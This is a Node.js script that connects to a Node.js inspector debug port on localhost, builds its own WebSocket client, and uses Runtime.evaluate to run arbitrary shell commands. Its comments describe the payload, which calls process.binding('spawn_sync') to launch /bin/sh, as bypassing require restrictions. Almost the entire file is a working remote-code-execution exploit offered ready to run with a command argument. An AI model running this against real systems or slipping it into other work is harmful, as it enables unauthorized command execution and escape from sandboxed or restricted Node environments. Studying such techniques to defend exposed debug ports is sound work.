const http = require('http');
const net = require('net');
const crypto = require('crypto');

// 1. CAPTURE THE SYSTEM COMMAND
const SYSTEM_COMMAND = process.argv[2];
if (!SYSTEM_COMMAND) {
  console.error('[-] Error: Please provide a command. Example: node ON.js "id"');
  process.exit(1);
}

const INSPECTOR_HOST = '127.0.0.1';
const INSPECTOR_PORT = 9229;

// Step 1: Query the inspector for its target metadata and get the WebSocket URL
function getDebuggerWebSocketUrl() {
  return new Promise((resolve, reject) => {
    http.get(`http://${INSPECTOR_HOST}:${INSPECTOR_PORT}/json/list`, (res) => {
      let data = '';
      res.on('data', (chunk) => (data += chunk));
      res.on('end', () => {
        try {
          const targets = JSON.parse(data);
          const target = (Array.isArray(targets) ? targets : [targets])
            .find((t) => t && t.webSocketDebuggerUrl);
          if (target) return resolve(target.webSocketDebuggerUrl);
          reject(new Error('No debuggable target with a WebSocket URL was found'));
        } catch (err) {
          reject(err);
        }
      });
    }).on('error', reject);
  });
}

// Step 2: Protocol compliant WebSocket connection handler
class InspectorSocket {
  constructor(wsUrl) {
    this.wsUrl = wsUrl;
    this.recvBuffer = Buffer.alloc(0);
    this.pendingRequest = null;
  }

  connect() {
    return new Promise((resolve, reject) => {
      const parsedUrl = new URL(this.wsUrl);
      const wsKey = crypto.randomBytes(16).toString('base64');

      this.socket = net.connect(INSPECTOR_PORT, INSPECTOR_HOST, () => {
        const handshakeRequest = [
          `GET ${parsedUrl.pathname}${parsedUrl.search} HTTP/1.1`,
          `Host: ${INSPECTOR_HOST}:${INSPECTOR_PORT}`,
          'Upgrade: websocket',
          'Connection: Upgrade',
          `Sec-WebSocket-Key: ${wsKey}`,
          'Sec-WebSocket-Version: 13',
          '', ''
        ].join('\r\n');
        this.socket.write(handshakeRequest);
      });

      let handshakeResponse = '';
      let handshakeComplete = false;

      this.socket.on('data', (chunk) => {
        if (!handshakeComplete) {
          handshakeResponse += chunk.toString('utf8');
          const headerEnd = handshakeResponse.indexOf('\r\n\r\n');
          if (headerEnd === -1) return; 
          handshakeComplete = true;
          this.recvBuffer = Buffer.from(handshakeResponse.slice(headerEnd + 4), 'utf8');
          this._processFrames();
          resolve();
        } else {
          this.recvBuffer = Buffer.concat([this.recvBuffer, chunk]);
          this._processFrames();
        }
      });

      this.socket.on('error', reject);
    });
  }

  _processFrames() {
    while (this.recvBuffer.length >= 2) {
      const opcode = this.recvBuffer[0] & 0x0f;
      let payloadLen = this.recvBuffer[1] & 0x7f;
      let offset = 2;

      if (payloadLen === 126) {
        if (this.recvBuffer.length < 4) return;
        payloadLen = this.recvBuffer.readUInt16BE(2);
        offset = 4;
      } else if (payloadLen === 127) {
        if (this.recvBuffer.length < 10) return;
        payloadLen = Number(this.recvBuffer.readBigUInt64BE(2));
        offset = 10;
      }

      if (this.recvBuffer.length < offset + payloadLen) return; 

      const payload = this.recvBuffer.slice(offset, offset + payloadLen);
      this.recvBuffer = this.recvBuffer.slice(offset + payloadLen);

      if (opcode === 1) { 
        const message = JSON.parse(payload.toString('utf8'));
        if (this.pendingRequest && this.pendingRequest.id === message.id) {
          this.pendingRequest.resolve(message);
          this.pendingRequest = null;
        }
      }
    }
  }

  send(command) {
    const payload = Buffer.from(JSON.stringify(command));
    const mask = crypto.randomBytes(4);
    const maskedPayload = Buffer.alloc(payload.length);
    for (let i = 0; i < payload.length; i++) {
      maskedPayload[i] = payload[i] ^ mask[i % 4];
    }

    let frameHeader;
    if (payload.length < 126) {
      frameHeader = Buffer.alloc(6);
      frameHeader[0] = 0x81; 
      frameHeader[1] = 0x80 | payload.length; 
      mask.copy(frameHeader, 2);
    } else {
      frameHeader = Buffer.alloc(8);
      frameHeader[0] = 0x81;
      frameHeader[1] = 0x80 | 126;
      frameHeader.writeUInt16BE(payload.length, 2);
      mask.copy(frameHeader, 4);
    }

    this.socket.write(Buffer.concat([frameHeader, maskedPayload]));
    return new Promise((resolve) => {
      this.pendingRequest = { id: command.id, resolve };
    });
  }
}

// Step 3: Connect and evaluate using memory-level native bindings
(async () => {
  const wsUrl = await getDebuggerWebSocketUrl();
  const inspector = new InspectorSocket(wsUrl);
  await inspector.connect();

  // Bypasses the require function restriction entirely using internal V8 module hooks
  const expressionToEvaluate = `
    (() => {
      try {
        const spawn_sync = process.binding('spawn_sync');
        const res = spawn_sync.spawn({
          file: '/bin/sh',
          args: ['/bin/sh', '-c', ${JSON.stringify(SYSTEM_COMMAND)}],
          stdio: [
            { type: 'pipe', readable: true, writable: false },
            { type: 'pipe', readable: false, writable: true },
            { type: 'pipe', readable: false, writable: true }
          ]
        });
        return res.output[1].toString();
      } catch(e) {
        return "Internal Payload Error: " + e.message;
      }
    })()
  `;

  const cmdResult = await inspector.send({
    id: 1,
    method: 'Runtime.evaluate',
    params: {
      expression: expressionToEvaluate
    }
  });

  if (cmdResult.result && cmdResult.result.result && cmdResult.result.result.value) {
    console.log(cmdResult.result.result.value.trim());
  } else {
    console.log('[-] Execution structure failed or returned empty data.');
  }

  process.exit(0);
})().catch((err) => {
  console.error('[-] Error: ' + err.message);
  process.exit(1);
});
